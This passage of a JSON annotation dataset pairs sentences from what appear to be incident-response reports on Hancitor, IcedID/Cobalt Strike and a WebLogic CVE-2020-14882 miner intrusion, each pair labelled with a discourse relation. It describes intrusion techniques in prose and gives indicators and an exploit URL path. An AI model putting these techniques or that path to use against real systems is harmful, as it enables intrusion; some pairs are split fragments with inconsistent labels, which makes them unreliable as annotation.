        "S2": "In addition, a Cobalt Strike beacon payload was downloaded, and deployed to perform post-exploitation activities.",
        "relation": "NEXT"
    },
    {
        "S1": "In addition, a Cobalt Strike beacon payload was downloaded, and deployed to perform post-exploitation activities.",
        "S2": "Once inside the target environment, port scans and a large amount of ICMP traffic was observed\u2013to identify additional active systems.",
        "relation": "MISC"
    },
    {
        "S1": "Once inside the target environment, port scans and a large amount of ICMP traffic was observed\u2013to identify additional active systems.",
        "S2": "After about 20 minutes, the threat actor copied a batch script file and DLL file to another system using the SMB protocol.",
        "relation": "NEXT"
    },
    {
        "S1": "After about 20 minutes, the threat actor copied a batch script file and DLL file to another system using the SMB protocol.",
        "S2": "A remote service was installed to start the batch file, which executed the Cobalt Strike shellcode-embedded DLL.",
        "relation": "MISC"
    },
    {
        "S1": "A remote service was installed to start the batch file, which executed the Cobalt Strike shellcode-embedded DLL.",
        "S2": "On the second compromised system, various discovery-related commands were executed before going silent.",
        "relation": "MISC"
    },
    {
        "S1": "On the second compromised system, various discovery-related commands were executed before going silent.",
        "S2": "The threat actors were evicted before completing their mission.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors were evicted before completing their mission.",
        "S2": "The Hancitor malware was embedded in a macro-based Word document.",
        "relation": "MISC"
    },
    {
        "S1": "The Hancitor malware was embedded in a macro-based Word document.",
        "S2": "This single-paged document contained a picture with instructions, attempting to lure the victim into enabling macros.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This single-paged document contained a picture with instructions, attempting to lure the victim into enabling macros.",
        "S2": "When the macro was enabled, the infection chain started, and the first-stage Hancitor DLL was dropped to disk.",
        "relation": "NEXT"
    },
    {
        "S1": "When the macro was enabled, the infection chain started, and the first-stage Hancitor DLL was dropped to disk.",
        "S2": "Reviewing the macro we can see that in sub yyy (towards the bottom) content within the document is being copied and used to create a file object by sub xxx which then is executed by the shell call to rundll32.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Reviewing the macro we can see that in sub yyy (towards the bottom) content within the document is being copied and used to create a file object by sub xxx which then is executed by the shell call to rundll32.",
        "S2": "Looking at the strings of the word document, we can see that there\u2019s an embedded OLE object, which appears to be a PE file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Looking at the strings of the word document, we can see that there\u2019s an embedded OLE object, which appears to be a PE file.",
        "S2": "The malicious Hancitor DLL in the OLE object, named \u201crem.r\u201d, was executed via rundll32.exe by passing the entry point \u201cESLMJYVFM\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malicious Hancitor DLL in the OLE object, named \u201crem.r\u201d, was executed via rundll32.exe by passing the entry point \u201cESLMJYVFM\u201d.",
        "S2": "The botnet ID and C2 were extracted using Hatching Triage:",
        "relation": "MISC"
    },
    {
        "S1": "The botnet ID and C2 were extracted using Hatching Triage:",
        "S2": "Later on in the intrusion, the threat actor used the following command to execute a Cobalt Strike Beacon on another machine:",
        "relation": "MISC"
    },
    {
        "S1": "Later on in the intrusion, the threat actor used the following command to execute a Cobalt Strike Beacon on another machine:",
        "S2": "On the beachhead system, the malicious Hancitor DLL injected into the svchost.exe process.",
        "relation": "MISC"
    },
    {
        "S1": "On the beachhead system, the malicious Hancitor DLL injected into the svchost.exe process.",
        "S2": "The code was injected into multiple instances of svchost.exe.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The code was injected into multiple instances of svchost.exe.",
        "S2": "Memory analysis also shows suspicious memory protections (page_execute_readwrite) and regions of the particular process.",
        "relation": "MISC"
    },
    {
        "S1": "Memory analysis also shows suspicious memory protections (page_execute_readwrite) and regions of the particular process.",
        "S2": "Finally, when looking at the process tree, we can identify the unusual parent-child process relationship of rundll32.exe starting svchost.exe.",
        "relation": "MISC"
    },
    {
        "S1": "Finally, when looking at the process tree, we can identify the unusual parent-child process relationship of rundll32.exe starting svchost.exe.",
        "S2": "The svchost.exe process, in turn, injected a Cobalt Strike beacon into multiple rundll32.exe instances.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The svchost.exe process, in turn, injected a Cobalt Strike beacon into multiple rundll32.exe instances.",
        "S2": "One of the injected rundll32.exe instance was also observed connecting to the Cobalt Strike C2 server.",
        "relation": "ELABORATION"
    },
    {
        "S1": "One of the injected rundll32.exe instance was also observed connecting to the Cobalt Strike C2 server.",
        "S2": "In addition, the malicious 95.dll, which was observed during the lateral movement phase, is also designed to evade automated sandbox analysis.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In addition, the malicious 95.dll, which was observed during the lateral movement phase, is also designed to evade automated sandbox analysis.",
        "S2": "This DLL is crafted in such a way that it wouldn\u2019t show malicious behavior if an exported function is not called by passing a specific parameter.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This DLL is crafted in such a way that it wouldn\u2019t show malicious behavior if an exported function is not called by passing a specific parameter.",
        "S2": "The DLL contains the Cobalt Strike shellcode and will only execute if the \u201c11985756\u201d parameter is passed to the TstSec function.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The DLL contains the Cobalt Strike shellcode and will only execute if the \u201c11985756\u201d parameter is passed to the TstSec function.",
        "S2": "After extracting the Cobalt Strike shellcode from 95.dll and emulating it via scdbg, we found that it\u2019s connecting to 162.244.83[.]95 over port 8080.",
        "relation": "MISC"
    },
    {
        "S1": "After extracting the Cobalt Strike shellcode from 95.dll and emulating it via scdbg, we found that it\u2019s connecting to 162.244.83[.]95 over port 8080.",
        "S2": "Since 95.dll was executed by rundll32.exe, and from the host logs, it is evident that rundll32.exe connected to 162.244.83[.]95 over port 8080.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Since 95.dll was executed by rundll32.exe, and from the host logs, it is evident that rundll32.exe connected to 162.244.83[.]95 over port 8080.",
        "S2": "Packet analysis to the IP address mentioned above, shows that it\u2019s downloading the Cobalt Strike beacon by initiating a HTTP GET request to /hVVH URI.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Packet analysis to the IP address mentioned above, shows that it\u2019s downloading the Cobalt Strike beacon by initiating a HTTP GET request to /hVVH URI.",
        "S2": "Once downloaded, the stager allocates a new memory region inside the current rundll32.exe process and loads it into the memory and starts the C2 activity.",
        "relation": "NEXT"
    },
    {
        "S1": "Once downloaded, the stager allocates a new memory region inside the current rundll32.exe process and loads it into the memory and starts the C2 activity.",
        "S2": "On the beachhead system, the threat actor started exploring their options to move laterally within the target network.",
        "relation": "MISC"
    },
    {
        "S1": "On the beachhead system, the threat actor started exploring their options to move laterally within the target network.",
        "S2": "The logged-on user account was utilized to interact with IPC$ shares.",
        "relation": "MISC"
    },
    {
        "S1": "The logged-on user account was utilized to interact with IPC$ shares.",
        "S2": "For one specific system, for which the threat actor showed interest, the contents of the C$ share was listed\u2013we assess, to verify if the account had access permissions to the share before copying the malware to it:",
        "relation": "ELABORATION"
    },
    {
        "S1": "For one specific system, for which the threat actor showed interest, the contents of the C$ share was listed\u2013we assess, to verify if the account had access permissions to the share before copying the malware to it:",
        "S2": "The threat actor also pinged one of the Active Directory domain controllers from the beachhead machine.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor also pinged one of the Active Directory domain controllers from the beachhead machine.",
        "S2": "A high amount of ICMP traffic, targeting various Class-A subnets ranges, was observed and used to identify other active systems within the environment.",
        "relation": "MISC"
    },
    {
        "S1": "A high amount of ICMP traffic, targeting various Class-A subnets ranges, was observed and used to identify other active systems within the environment.",
        "S2": "On the second system, to which the adversary laterally moved (see section below), the following discovery commands were executed:",
        "relation": "MISC"
    },
    {
        "S1": "On the second system, to which the adversary laterally moved (see section below), the following discovery commands were executed:",
        "S2": "The injected svchost process dropped two files: a batch-file named: \u201c95.bat\u201d and a DLL-file named: \u201c95.dll\u201d.",
        "relation": "MISC"
    },
    {
        "S1": "The injected svchost process dropped two files: a batch-file named: \u201c95.bat\u201d and a DLL-file named: \u201c95.dll\u201d.",
        "S2": "Both files were copied to the ProgramData folder of another system within the environment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Both files were copied to the ProgramData folder of another system within the environment.",
        "S2": "The content of the batch file can be seen below\u2013it executes the transferred DLL and then deletes itself:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The content of the batch file can be seen below\u2013it executes the transferred DLL and then deletes itself:",
        "S2": "To execute the batch file, the threat actor installed, and started, a remote service on the other system.",
        "relation": "NEXT"
    },
    {
        "S1": "To execute the batch file, the threat actor installed, and started, a remote service on the other system.",
        "S2": "An attempt to open lsass.exe process was observed on the system where lateral movement occurred but there were no signs of successful read attempts.",
        "relation": "MISC"
    },
    {
        "S1": "An attempt to open lsass.exe process was observed on the system where lateral movement occurred but there were no signs of successful read attempts.",
        "S2": "In the network traffic, we can identify a data stream pattern that is distinctive to Hancitor malware.",
        "relation": "MISC"
    },
    {
        "S1": "In the network traffic, we can identify a data stream pattern that is distinctive to Hancitor malware.",
        "S2": "First, the malware performed a lookup of the external IP-address of the infected system (1).",
        "relation": "MISC"
    },
    {
        "S1": "First, the malware performed a lookup of the external IP-address of the infected system (1).",
        "S2": "This was followed by Hancitor C2 traffic, sent via HTTP POST requests, which included unique attributes of the infected system, such as hostname and username information (2).",
        "relation": "NEXT"
    },
    {
        "S1": "This was followed by Hancitor C2 traffic, sent via HTTP POST requests, which included unique attributes of the infected system, such as hostname and username information (2).",
        "S2": "Hancitor then attempted to download additional malware.",
        "relation": "NEXT"
    },
    {
        "S1": "Hancitor then attempted to download additional malware.",
        "S2": "This included the info-stealer known as \u201cFicker Stealer\u201d (4), for which the DNS traffic corresponds to a recent article posted by Brad.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This included the info-stealer known as \u201cFicker Stealer\u201d (4), for which the DNS traffic corresponds to a recent article posted by Brad.",
        "S2": "However, in our case, the post infection HTTP traffic of Ficker Stealer was not observed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, in our case, the post infection HTTP traffic of Ficker Stealer was not observed.",
        "S2": "Hancitor also attempted to download Cobalt Strike stagers (.bin files) (3), and Cobalt Strike traffic was sent both encrypted and unencrypted (5).",
        "relation": "MISC"
    },
    {
        "S1": "We assess with medium confidence that the initial IcedID infection was delivered via a malspam campaign, which included an attachment with a password protected zip archive.",
        "S2": "Once extracted, the user would find a Word document with a macro, which upon execution, would deliver the initial DLL loader.",
        "relation": "NEXT"
    },
    {
        "S1": "Once extracted, the user would find a Word document with a macro, which upon execution, would deliver the initial DLL loader.",
        "S2": "Discovered in 2017, what started as a commodity malware, IcedID is now currently being deployed as an initial access broker by ransomware threat actors.",
        "relation": "MISC"
    },
    {
        "S1": "Discovered in 2017, what started as a commodity malware, IcedID is now currently being deployed as an initial access broker by ransomware threat actors.",
        "S2": "In this case, the threat actor appeared to have specific goals, and did not waste any time.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this case, the threat actor appeared to have specific goals, and did not waste any time.",
        "S2": "Within 35 minutes after the initial infection, they made their way in to the network via a Cobalt Strike Beacon deployed from the IcedID infected host.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Within 35 minutes after the initial infection, they made their way in to the network via a Cobalt Strike Beacon deployed from the IcedID infected host.",
        "S2": "The first task of the threat actor was to enumerate the network by establishing a list of the domain admins using living off the land techniques, such as net.exe.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The first task of the threat actor was to enumerate the network by establishing a list of the domain admins using living off the land techniques, such as net.exe.",
        "S2": "A freely available tool Adfind.exe was also utilized to further enumerate the domain.",
        "relation": "NEXT"
    },
    {
        "S1": "A freely available tool Adfind.exe was also utilized to further enumerate the domain.",
        "S2": "The threat actor was also observed stealing credentials from the lsass.exe process.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor was also observed stealing credentials from the lsass.exe process.",
        "S2": "Five minutes after the above discovery activity, we observed the actors moving laterally to other hosts on the network with the credentials of a domain administrator account.",
        "relation": "NEXT"
    },
    {
        "S1": "Five minutes after the above discovery activity, we observed the actors moving laterally to other hosts on the network with the credentials of a domain administrator account.",
        "S2": "In this case, Cobalt Strike was also used to create the administrative token, and attempted to install a service using a windows service executable.",
        "relation": "NEXT"
    },
    {
        "S1": "In this case, Cobalt Strike was also used to create the administrative token, and attempted to install a service using a windows service executable.",
        "S2": "The service was tasked to run an encoded PowerShell command which would download and execute the Cobalt Strike beacon over HTTP.",
        "relation": "NEXT"
    },
    {
        "S1": "The service was tasked to run an encoded PowerShell command which would download and execute the Cobalt Strike beacon over HTTP.",
        "S2": "Based on the name of the hosts that the threat actors decided to pivot, we judge that they were able to digest the \u2018AdFind\u2019 results and focus on, what they believed to be, important targets \u2013 critical assets such as file servers, domain controllers, etc.",
        "relation": "MISC"
    },
    {
        "S1": "Based on the name of the hosts that the threat actors decided to pivot, we judge that they were able to digest the \u2018AdFind\u2019 results and focus on, what they believed to be, important targets \u2013 critical assets such as file servers, domain controllers, etc.",
        "S2": "It is also worth mentioning that even after the unsuccessful remote execution attempt against a few servers due to AV, the actors decided to connect via RDP and spend over an hour looking for valuable data before disconnecting and leaving the network.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is also worth mentioning that even after the unsuccessful remote execution attempt against a few servers due to AV, the actors decided to connect via RDP and spend over an hour looking for valuable data before disconnecting and leaving the network.",
        "S2": "No exfiltration of data or impact to the systems was observed but at least one command and control.",
        "relation": "MISC"
    },
    {
        "S1": "No exfiltration of data or impact to the systems was observed but at least one command and control.",
        "S2": "It is unclear why the actors decided not to continue with their operation.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is unclear why the actors decided not to continue with their operation.",
        "S2": "No attempt was made to clean up the intrusion by the actors \u2013 artifacts that were deployed were still in operation, including C2 implants.",
        "relation": "ELABORATION"
    },
    {
        "S1": "No attempt was made to clean up the intrusion by the actors \u2013 artifacts that were deployed were still in operation, including C2 implants.",
        "S2": "The first stage of the IcedID malware that was executed on the host was dropped via a macro enabled Word document \u2013 as seen by Unit42.",
        "relation": "MISC"
    },
    {
        "S1": "The first stage of the IcedID malware that was executed on the host was dropped via a macro enabled Word document \u2013 as seen by Unit42.",
        "S2": "IOCs from Brad here.",
        "relation": "MISC"
    },
    {
        "S1": "IOCs from Brad here.",
        "S2": "In our case, the IcedID dll loader was manually executed using regsvr32.",
        "relation": "MISC"
    },
    {
        "S1": "In our case, the IcedID dll loader was manually executed using regsvr32.",
        "S2": "From the initial access, a scheduled task was created.",
        "relation": "NEXT"
    },
    {
        "S1": "From the initial access, a scheduled task was created.",
        "S2": "This can be observed by EventID 106: New task registered:",
        "relation": "ELABORATION"
    },
    {
        "S1": "This can be observed by EventID 106: New task registered:",
        "S2": "Inspection of the task file located under \u2018c:\\windows\\system32\\tasks\u2019:",
        "relation": "MISC"
    },
    {
        "S1": "Inspection of the task file located under \u2018c:\\windows\\system32\\tasks\u2019:",
        "S2": "\u2018License.dat\u2019 is an encrypted binary file and is a tell-tale indication of an IcedID compromise.",
        "relation": "MISC"
    },
    {
        "S1": "\u2018License.dat\u2019 is an encrypted binary file and is a tell-tale indication of an IcedID compromise.",
        "S2": "The corresponding DLL (upefkuin4.dll) is used with license.dat to maintain persistence using the Task Scheduler.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The corresponding DLL (upefkuin4.dll) is used with license.dat to maintain persistence using the Task Scheduler.",
        "S2": "After decrypting License.dat using Binary Defense\u2019s decryption tool, we can see some information stealing functionality:",
        "relation": "NEXT"
    },
    {
        "S1": "After decrypting License.dat using Binary Defense\u2019s decryption tool, we can see some information stealing functionality:",
        "S2": "EventID 200: Task executed shows the persistent IcedID core being executed, on average every 1 hour via Rundll32.exe.",
        "relation": "MISC"
    },
    {
        "S1": "EventID 200: Task executed shows the persistent IcedID core being executed, on average every 1 hour via Rundll32.exe.",
        "S2": "The LSASS process was accessed by an unusual process \u201cwuauclt.exe\u201d on the beachhead host.",
        "relation": "MISC"
    },
    {
        "S1": "The LSASS process was accessed by an unusual process \u201cwuauclt.exe\u201d on the beachhead host.",
        "S2": "This was the Cobalt Strike Beacon and was used to access the credentials.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This was the Cobalt Strike Beacon and was used to access the credentials.",
        "S2": "This is not the first time we have observed this process (wuauclt.exe) being used.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This is not the first time we have observed this process (wuauclt.exe) being used.",
        "S2": "In our previous report with another IcedID infection leading to Sodinokibi ransomware we also observed the same process being used.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In our previous report with another IcedID infection leading to Sodinokibi ransomware we also observed the same process being used.",
        "S2": "The same process was also observed invoking PowerShell scripts:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The same process was also observed invoking PowerShell scripts:",
        "S2": "\u201cWuauclt.exe\u201d is normally used for the Microsoft Windows Update Service and this was an attempt to blend into the OS environment.",
        "relation": "MISC"
    },
    {
        "S1": "\u201cWuauclt.exe\u201d is normally used for the Microsoft Windows Update Service and this was an attempt to blend into the OS environment.",
        "S2": "Discovery commands were run by IcedID during the initial execution on the beachhead.",
        "relation": "MISC"
    },
    {
        "S1": "Discovery commands were run by IcedID during the initial execution on the beachhead.",
        "S2": "These commands use the Microsoft Windows built-in commands and utilities, such as WMIC, ipconfig, etc.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These commands use the Microsoft Windows built-in commands and utilities, such as WMIC, ipconfig, etc.",
        "S2": "The aim was to determine the installed Anti-virus software, network configuration, domain configuration and user accounts.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The aim was to determine the installed Anti-virus software, network configuration, domain configuration and user accounts.",
        "S2": "The following are the commands that were executed:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The following are the commands that were executed:",
        "S2": "Using the information gathered, the IcedID operator was able to focus on specific targets, obtaining access to the privileged accounts and the high value hosts.",
        "relation": "NEXT"
    },
    {
        "S1": "Using the information gathered, the IcedID operator was able to focus on specific targets, obtaining access to the privileged accounts and the high value hosts.",
        "S2": "Once the IcedID operators were able to establish a C2 session to the initial compromised host, the operators were observed executing the following command:",
        "relation": "NEXT"
    },
    {
        "S1": "Once the IcedID operators were able to establish a C2 session to the initial compromised host, the operators were observed executing the following command:",
        "S2": "Interestingly, we observed the operator deploying and utilizing AdFind to collect information about the hosts on the network.",
        "relation": "MISC"
    },
    {
        "S1": "Interestingly, we observed the operator deploying and utilizing AdFind to collect information about the hosts on the network.",
        "S2": "AdFind is an Active Directory query tool developed by JoeWare, a useful utility for system administrators, but also popular among threat actors.",
        "relation": "ELABORATION"
    },
    {
        "S1": "AdFind is an Active Directory query tool developed by JoeWare, a useful utility for system administrators, but also popular among threat actors.",
        "S2": "AdFind was transferred and executed on the beachhead host.",
        "relation": "ELABORATION"
    },
    {
        "S1": "AdFind was transferred and executed on the beachhead host.",
        "S2": "The threat actor placed the AdFind binary and the results in the \u2018C:\\Recovery\u2019 folder.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor placed the AdFind binary and the results in the \u2018C:\\Recovery\u2019 folder.",
        "S2": "We assess this folder location was chosen to avoid raising suspicion, as compared to executing from a user or temporary folder location.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We assess this folder location was chosen to avoid raising suspicion, as compared to executing from a user or temporary folder location.",
        "S2": "The threat actors attempted and successfully managed to pivot laterally to various hosts on the domain.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors attempted and successfully managed to pivot laterally to various hosts on the domain.",
        "S2": "This was achieved by connecting via SMB and starting a service that would execute an encrypted PowerShell command with embedded Cobalt Strike SMB beacons.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This was achieved by connecting via SMB and starting a service that would execute an encrypted PowerShell command with embedded Cobalt Strike SMB beacons.",
        "S2": "The PowerShell is base64 encoded.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The PowerShell is base64 encoded.",
        "S2": "Decoding the PowerShell shows that the SMB pipe is named \\\\.\\pipe\\halfduplux_9e.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Decoding the PowerShell shows that the SMB pipe is named \\\\.\\pipe\\halfduplux_9e.",
        "S2": "Using the \u2018Administrator\u2019 account, SMB sessions were established to the hosts, primarily using ADMIN$, but IPC$ was also observed.",
        "relation": "NEXT"
    },
    {
        "S1": "Using the \u2018Administrator\u2019 account, SMB sessions were established to the hosts, primarily using ADMIN$, but IPC$ was also observed.",
        "S2": "This activity triggered two Emerging Threat (ET) alerts related to RPC access and binary execution, \u201cET RPC DCERPC SVCCTL \u2013 Remote Service Control Manager Access\u201d and \u201cET POLICY SMB2 NT Create AndX Request For an Executable File\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This activity triggered two Emerging Threat (ET) alerts related to RPC access and binary execution, \u201cET RPC DCERPC SVCCTL \u2013 Remote Service Control Manager Access\u201d and \u201cET POLICY SMB2 NT Create AndX Request For an Executable File\u201d.",
        "S2": "Throughout the intrusion the threat actor used a mix of Port 80 and 443 for C2.",
        "relation": "MISC"
    },
    {
        "S1": "Throughout the intrusion the threat actor used a mix of Port 80 and 443 for C2.",
        "S2": "Port 80 was observed in the communication to testsubnet[.]com which contains a HTTP Cookie in the format: wordpress_<Base64EncodedString>.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Port 80 was observed in the communication to testsubnet[.]com which contains a HTTP Cookie in the format: wordpress_<Base64EncodedString>.",
        "S2": "This activity was observed at a rate of every 2-4 seconds.",
        "relation": "MISC"
    },
    {
        "S1": "This activity was observed at a rate of every 2-4 seconds.",
        "S2": "No exfiltration was observed; however, we were able to determine that access to the File server was achieved, with multiple access attempts and successes.",
        "relation": "MISC"
    },
    {
        "S1": "No exfiltration was observed; however, we were able to determine that access to the File server was achieved, with multiple access attempts and successes.",
        "S2": "No impact was observed nor any follow-on activities to deny, disrupt or destroy data or systems.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In the attack, the threat actor took around 2 minutes from initial access, to running a persistent coin miner.",
        "S2": "The speed and number of times the exploit was ran against the target make it likely that this was an automated attack, rather than human operated intrusion.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The speed and number of times the exploit was ran against the target make it likely that this was an automated attack, rather than human operated intrusion.",
        "S2": "The threat actor exploited CVE-2020-14882 by making a request to the WebLogic server, which allowed the attacker to execute code.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor exploited CVE-2020-14882 by making a request to the WebLogic server, which allowed the attacker to execute code.",
        "S2": "The payload then ran a PowerShell command to download a PowerShell script from a remote server.",
        "relation": "NEXT"
    },
    {
        "S1": "The payload then ran a PowerShell command to download a PowerShell script from a remote server.",
        "S2": "This script downloaded a loader and executed it, then it enabled persistence mechanisms.",
        "relation": "NEXT"
    },
    {
        "S1": "This script downloaded a loader and executed it, then it enabled persistence mechanisms.",
        "S2": "Next, the loader downloaded XMRig, and started the mining process.",
        "relation": "NEXT"
    },
    {
        "S1": "Next, the loader downloaded XMRig, and started the mining process.",
        "S2": "While this attack took place around a month ago the payloads used in the intrusion continue to be hosted as of this publication, indicating that this threat is still active and finding vulnerable WebLogic hosts to continue exploiting.",
        "relation": "MISC"
    },
    {
        "S1": "While this attack took place around a month ago the payloads used in the intrusion continue to be hosted as of this publication, indicating that this threat is still active and finding vulnerable WebLogic hosts to continue exploiting.",
        "S2": "Analysis and reporting completed by @tas_kmanager and @TheDFIRReport",
        "relation": "MISC"
    },
    {
        "S1": "Analysis and reporting completed by @tas_kmanager and @TheDFIRReport",
        "S2": "Reviewed by @iiamaleks and @samaritan_o",
        "relation": "ELABORATION"
    },
    {
        "S1": "Reviewed by @iiamaleks and @samaritan_o",
        "S2": "Before jumping into the details of the attack, it is pertinent to understand CVE-2020-14882.",
        "relation": "MISC"
    },
    {
        "S1": "Before jumping into the details of the attack, it is pertinent to understand CVE-2020-14882.",
        "S2": "This vulnerability was discovered back in October 2020, which effects Oracle\u2019s WebLogic product.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This vulnerability was discovered back in October 2020, which effects Oracle\u2019s WebLogic product.",
        "S2": "[1] We previously reported on an intrusion that also used this exploit and ended in a coin miner.",
        "relation": "ELABORATION"
    },
    {
        "S1": "[1] We previously reported on an intrusion that also used this exploit and ended in a coin miner.",
        "S2": "This vulnerability is easy to exploit, and leads to remote code execution (RCE) without authentication.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This vulnerability is easy to exploit, and leads to remote code execution (RCE) without authentication.",
        "S2": "Just by invoking URL path /console/images/%252E%252E%252Fconsole.portal and a little bit of tweaking of the packet sent to the server, the threat actor will be able to run their code on the server.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Just by invoking URL path /console/images/%252E%252E%252Fconsole.portal and a little bit of tweaking of the packet sent to the server, the threat actor will be able to run their code on the server.",
        "S2": "In this case, we can clearly see from network logs that the attacker was probing the portal page and followed that by sending the crafted URL request.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this case, we can clearly see from network logs that the attacker was probing the portal page and followed that by sending the crafted URL request.",
        "S2": "The detailed payload in the header can be observed below:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The detailed payload in the header can be observed below:",
        "S2": "Interestingly, we can see the threat actor chose the FileSystemXmlApplicationContext class to carry out this attack, executing a file named poc.xml.",
        "relation": "MISC"
    },
    {
        "S1": "Interestingly, we can see the threat actor chose the FileSystemXmlApplicationContext class to carry out this attack, executing a file named poc.xml.",
        "S2": "This technique is listed in PoC developed by Jang.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This technique is listed in PoC developed by Jang.",
        "S2": "[2",
        "relation": "MISC"
    },
    {
        "S1": "[2",
        "S2": "]",
        "relation": "MISC"
    },
    {
        "S1": "]",
        "S2": "Below we can see the payload inside of the xml file hosted in the attacker server.",
        "relation": "MISC"
    },
    {
        "S1": "Below we can see the payload inside of the xml file hosted in the attacker server.",
        "S2": "The payload will execute the PowerShell command on the vulnerable system.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The payload will execute the PowerShell command on the vulnerable system.",
        "S2": "The threat actor leveraged the WebLogic vulnerability to spawn a command shell from the server running in the Java process, which then in turn, was used to run PowerShell and collect the final payload that the threat actor wished to run on the system.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor leveraged the WebLogic vulnerability to spawn a command shell from the server running in the Java process, which then in turn, was used to run PowerShell and collect the final payload that the threat actor wished to run on the system.",
        "S2": "Next, let us investigate the content of the PowerShell script (ldr.ps1)",
        "relation": "ELABORATION"
    },
    {
        "S1": "Next, let us investigate the content of the PowerShell script (ldr.ps1)",
        "S2": "On line one, we can see var $cc (can be pronounced as C2?) that indicates the server where it will get all the other components such as the payload sys.exe.",
        "relation": "ELABORATION"
    },
    {
        "S1": "On line one, we can see var $cc (can be pronounced as C2?) that indicates the server where it will get all the other components such as the payload sys.exe.",
        "S2": "The next line sets up random characters to be appended to the payload executable.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The next line sets up random characters to be appended to the payload executable.",
        "S2": "This binary (renamed to sysvr013.exe) was then executed by the same script.",
        "relation": "NEXT"
    },
    {
        "S1": "This binary (renamed to sysvr013.exe) was then executed by the same script.",
        "S2": "There are several persistence mechanisms observed.",
        "relation": "MISC"
    },
    {
        "S1": "There are several persistence mechanisms observed.",
        "S2": "The first one utilizes schtasks to create a task called \u201cBrowserUpdate\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The first one utilizes schtasks to create a task called \u201cBrowserUpdate\u201d.",
        "S2": "It also created a registry run key to execute the miner binary on reboot.",
        "relation": "LIST"
    },
    {
        "S1": "It also created a registry run key to execute the miner binary on reboot.",
        "S2": "We also observed the Loader binary adding npf.sys (WinPcap binary) as a scheduled task.",
        "relation": "LIST"
    },
    {
        "S1": "We also observed the Loader binary adding npf.sys (WinPcap binary) as a scheduled task.",
        "S2": "No privilege escalation was observed, but note that the Java.exe process was running as a high integrity process from the start.",
        "relation": "MISC"
    },
    {
        "S1": "No privilege escalation was observed, but note that the Java.exe process was running as a high integrity process from the start.",
        "S2": "From the PowerShell script above (ldr.ps1), we can see that name is being randomized to avoid detection by blue team.",
        "relation": "MISC"
    },
    {
        "S1": "From the PowerShell script above (ldr.ps1), we can see that name is being randomized to avoid detection by blue team.",
        "S2": "We can also see that the attacker disabled firewall rules to make sure connection to the mining pool was not blocked.",
        "relation": "MISC"
    },
    {
        "S1": "We can also see that the attacker disabled firewall rules to make sure connection to the mining pool was not blocked.",
        "S2": "As noted above, the attacker created a task called \u201cBrowserUpdate\u201d to masquerade the scheduled task as a web browser update task.",
        "relation": "MISC"
    },
    {
        "S1": "As noted above, the attacker created a task called \u201cBrowserUpdate\u201d to masquerade the scheduled task as a web browser update task.",
        "S2": "We can see several local discovery commands executed from the PowerShell script.",
        "relation": "MISC"
    },
    {
        "S1": "We can see several local discovery commands executed from the PowerShell script.",
        "S2": "They are looking for existing mining process on the machine, such as kthreaddi, sysrv, etc.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They are looking for existing mining process on the machine, such as kthreaddi, sysrv, etc.",
        "S2": "They also utilize netstat to find if any process is using mining related ports, such as 3333, 4444, etc.",
        "relation": "LIST"
    },
    {
        "S1": "They also utilize netstat to find if any process is using mining related ports, such as 3333, 4444, etc.",
        "S2": "This is likely partially to kill other rival miners but also to prevent duplicate miners on the same host as the exploit was executed against the target repeatedly in quick succession, at least 12 times.",
        "relation": "NEXT"
    },
    {
        "S1": "This is likely partially to kill other rival miners but also to prevent duplicate miners on the same host as the exploit was executed against the target repeatedly in quick succession, at least 12 times.",
        "S2": "We saw that the additional sys.exe binary and ldr.ps1 PowerShell script was brought in to support the Mining operation from IP address 194[.]145[.]227[.]21",
        "relation": "MISC"
    },
    {
        "S1": "We saw that the additional sys.exe binary and ldr.ps1 PowerShell script was brought in to support the Mining operation from IP address 194[.]145[.]227[.]21",
        "S2": "We also observed connection from [kthreaddi].exe talking to crypto mining pools",
        "relation": "MISC"
    },
    {
